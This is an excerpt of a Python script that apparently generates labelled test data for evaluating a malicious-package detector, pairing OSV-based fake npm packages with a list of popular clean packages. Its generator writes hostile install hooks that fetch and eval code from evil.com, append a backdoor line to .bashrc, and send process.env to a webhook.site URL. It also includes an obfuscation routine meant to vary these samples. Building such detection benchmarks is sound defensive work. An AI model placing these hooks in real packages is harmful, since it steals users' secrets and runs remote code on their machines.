...
class OSVVulnerabilityFetcher:
    ...
    def _extract_attack_vectors(cls, vuln: Dict) -> List[str]:
        ...
        patterns = {
            "code injection": ["eval", "exec", "code injection", "remote code execution"],
...
class MaliciousPackageGenerator:
    ...
    def generate_npm_malicious_package(cls, vuln_data: Dict) -> Tuple[str, str]:
        ...
        if "code injection" in attack_vectors:
            scripts["postinstall"] = "node -e \"eval(require('child_process').execSync('curl -s https://evil.com/stage2.js').toString())\""
            ...
            scripts["install"] = "node -e \"require('fs').writeFileSync('../../../.bashrc', '\\\\nexport BACKDOOR=1\\\\n', {flag: 'a'})\""
        else:
            # Default credential harvesting
            scripts["postinstall"] = "node -e \"require('https').get('https://webhook.site/exfil?env='+encodeURIComponent(JSON.stringify(process.env)))\""
...
'''
    ...
    @classmethod
    def generate_obfuscated_variant(cls, original_content: str, filename: str) -> Tuple[str, str]:
                ...
                for key, script in data["scripts"].items():
                    ...
                    for i, word in enumerate(words):
                        if i % 3 == 0 and len(word) > 3:  # Obfuscate every third word
                            encoded = ''.join(f'\\\\u{ord(c):04x}' for c in word[:3]) + word[3:]
            ...
            for line in lines:
                ...
                if "=" in line and not line.strip().startswith("import"):
                    ...
                    if len(parts) == 2:
                        ...
                        value = parts[1].strip()
                        obfuscated_var = f"_0x{''.join(random.choices('0123456789abcdef', k=6))}"
                        line = line.replace(var_name, obfuscated_var)
                
                # Add string obfuscation
                if '"' in line and not "import" in line:
                    ...
                    for s in strings:
                        if len(s) > 5 and random.random() < 0.5:
                            ...
                            line = line.replace(f'"{s}"', f'"{hex_encoded}".encode().decode("unicode_escape")')
...
class CleanPackageDataset:
    ...
    CLEAN_PACKAGES = {
        "npm": [
            "lodash", "express", "react", "vue", "angular", "webpack", "babel-core",
            "moment", "axios", "typescript", "eslint", "prettier", "jest", "mocha", 
            "cors", "dotenv", "nodemon", "chalk", "commander", "inquirer", "yargs",
            "socket.io", "passport", "bcrypt", "jsonwebtoken", "mongoose", "sequelize",
            "cheerio", "helmet", "morgan", "compression", "multer", "sharp", "uuid"
        ],
        "pypi": [
            "requests", "numpy", "pandas", "flask", "django", "sqlalchemy", "pytest",
            "click", "jinja2", "pyyaml", "pillow", "matplotlib", "scipy", "psutil",
            "python-dateutil", "pytz", "six", "setuptools", "wheel", "pip", "virtualenv",
            "boto3", "cryptography", "certifi", "urllib3", "idna", "charset-normalizer",
            "pydantic", "fastapi", "httpx", "aiohttp", "websockets", "redis", "celery"
        ]
    }
...
'''
    ...
    def get_random_clean_packages(cls, count: int = 50) -> List[Tuple[str, str]]:
        ...
        # Add npm packages
        npm_packages = random.sample(cls.CLEAN_PACKAGES["npm"], min(count//2, len(cls.CLEAN_PACKAGES["npm"])))
        all_packages.extend([(pkg, "npm") for pkg in npm_packages])
        
        # Add python packages
        remaining = count - len(all_packages)
        pypi_packages = random.sample(cls.CLEAN_PACKAGES["pypi"], min(remaining, len(cls.CLEAN_PACKAGES["pypi"])))
...
def main():
    ...
    parser = argparse.ArgumentParser(description="Generate test data for D1-D4 evaluation")
    parser.add_argument("--type", choices=["osv", "clean", "load"], required=True,
    ...
    if args.type == "osv":
        ...
        with open(output_dir / "clean_packages.json", "w") as f:
            json.dump([{"name": name, "ecosystem": eco} for name, eco in packages], f, indent=2)
